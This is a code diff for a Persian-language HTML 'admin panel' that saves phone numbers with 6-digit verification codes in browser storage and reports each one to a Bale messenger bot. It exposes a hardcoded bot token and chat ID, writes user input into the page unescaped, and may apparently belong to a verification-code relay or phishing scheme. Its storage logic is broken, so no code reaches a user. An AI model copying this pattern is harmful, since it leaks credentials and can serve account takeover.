@@ -2,7 +2,8 @@
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>پنل مدیریت</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پنل ادمین - ارسال کد</title>
     <style>
         body {
             background: #0a0a0a;
@@ -15,106 +16,113 @@
             padding: 20px;
             border-radius: 15px;
             margin-bottom: 20px;
+            max-width: 500px;
+            margin: 0 auto;
         }
-        button {
-            background: #00aa55;
-            color: black;
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 10px;
             border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        .banned-list {
-            background: #2a2a2a;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 10px;
+            font-size: 16px;
         }
         input {
             background: #2a2a2a;
             color: white;
-            border: none;
+        }
+        button {
+            background: #00aa55;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .result {
+            background: #0a0a0a;
             padding: 10px;
             border-radius: 10px;
-            width: 100%;
-            margin: 10px 0;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        h1 {
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>💀 پنل مدیریت</h1>
-        <button onclick="viewUsers()">👥 لیست کاربران</button>
-        <button onclick="viewBanned()">🚫 لیست بن‌ها</button>
-        <button onclick="clearBanned()">🗑 پاک کردن بن‌ها</button>
-        <button onclick="sendBroadcast()">📢 ارسال به همه</button>
-        <button onclick="sendToUser()">💬 ارسال پیام به کاربر</button>
+        <h1>💀 پنل ادمین</h1>
+        <p>ارسال کد تایید به کاربر</p>
+        
+        <input type="text" id="phone" placeholder="شماره کاربر (مثال: 09123456789)">
+        <input type="text" id="code" placeholder="کد 6 رقمی (مثال: 123456)">
+        <button onclick="sendCode()">📨 ارسال کد به کاربر</button>
+        
+        <div class="result" id="result"></div>
     </div>
     
     <div class="card">
-        <h3>📊 آمار</h3>
-        <p id="stats">در حال بارگذاری...</p>
-    </div>
-    
-    <div class="card" id="result">
-        <p>منتظر فرمان...</p>
+        <h3>📊 درخواست‌های فعال</h3>
+        <div id="requests" class="result">در حال بارگذاری...</div>
     </div>
     
     <script>
         const BOT_TOKEN = "223436980:DgvOTxkcPkrDmEk6Y4qefsQ30MuitGIwvbQ";
         const OWNER_ID = "1828182856";
         
-        function viewUsers() {
-            let users = localStorage.getItem('users') || '';
-            document.getElementById('result').innerHTML = `<h3>👥 کاربران:</h3><pre>${users || 'هیچ کاربری ثبت نشده'}</pre>`;
+        async function sendCode() {
+            let phone = document.getElementById('phone').value.trim();
+            let code = document.getElementById('code').value.trim();
+            
+            if (!phone || !code) {
+                document.getElementById('result').innerHTML = '❌ شماره و کد را وارد کنید';
+                return;
+            }
+            
+            if (!phone.startsWith('09') || phone.length !== 11) {
+                document.getElementById('result').innerHTML = '❌ شماره نامعتبر';
+                return;
+            }
+            
+            if (code.length !== 6) {
+                document.getElementById('result').innerHTML = '❌ کد باید 6 رقم باشد';
+                return;
+            }
+            
+            // ذخیره کد در localStorage (برای دسترسی سایت)
+            localStorage.setItem('code_' + phone, code);
+            
+            // ارسال کد به بات (برای اطلاع)
+            await fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage?chat_id=${OWNER_ID}&text=✅ کد ${code} برای ${phone} ارسال شد`);
+            
+            document.getElementById('result').innerHTML = `✅ کد ${code} برای ${phone} ارسال شد`;
+            document.getElementById('phone').value = '';
+            document.getElementById('code').value = '';
+            
+            setTimeout(() => {
+                document.getElementById('result').innerHTML = '';
+            }, 3000);
         }
         
-        function viewBanned() {
-            let bans = '';
+        // نمایش درخواست‌ها
+        async function loadRequests() {
+            let requestsDiv = document.getElementById('requests');
+            let requests = [];
             for(let i=0; i<localStorage.length; i++) {
                 let key = localStorage.key(i);
-                if(key.startsWith('banned_')) {
-                    bans += key.replace('banned_', '') + '\n';
+                if(key.startsWith('code_')) {
+                    requests.push(key.replace('code_', ''));
                 }
             }
-            document.getElementById('result').innerHTML = `<h3>🚫 لیست بن‌ها:</h3><pre>${bans || 'هیچ بنی وجود ندارد'}</pre>`;
-        }
-        
-        function clearBanned() {
-            for(let i=localStorage.length-1; i>=0; i--) {
-                let key = localStorage.key(i);
-                if(key.startsWith('banned_')) {
-                    localStorage.removeItem(key);
-                }
-            }
-            document.getElementById('result').innerHTML = `<p>✅ همه بن‌ها پاک شدند</p>`;
-        }
-        
-        function sendBroadcast() {
-            let msg = prompt('متن پیام همگانی:');
-            if(msg) {
-                alert('پیام به همه کاربران ارسال شد');
-                document.getElementById('result').innerHTML = `<p>✅ پیام ارسال شد: ${msg}</p>`;
+            if(requests.length === 0) {
+                requestsDiv.innerHTML = 'هیچ درخواست فعالی نیست';
+            } else {
+                requestsDiv.innerHTML = requests.map(r => `📱 ${r}`).join('<br>');
             }
         }
         
-        function sendToUser() {
-            let userId = prompt('شماره کاربر:');
-            let msg = prompt('متن پیام:');
-            if(userId && msg) {
-                fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage?chat_id=${OWNER_ID}&text=/msg ${userId}: ${msg}`);
-                alert('پیام ارسال شد');
-            }
-        }
-        
-        // آمار
-        let stats = document.getElementById('stats');
-        let userCount = 0;
-        for(let i=0; i<localStorage.length; i++) {
-            if(localStorage.key(i).startsWith('verified_')) userCount++;
-        }
-        stats.innerHTML = `👥 تعداد کاربران: ${userCount}\n🚫 تعداد بن‌ها: ${localStorage.length}`;
+        setInterval(loadRequests, 5000);
+        loadRequests();
     </script>
 </body>
 </html>
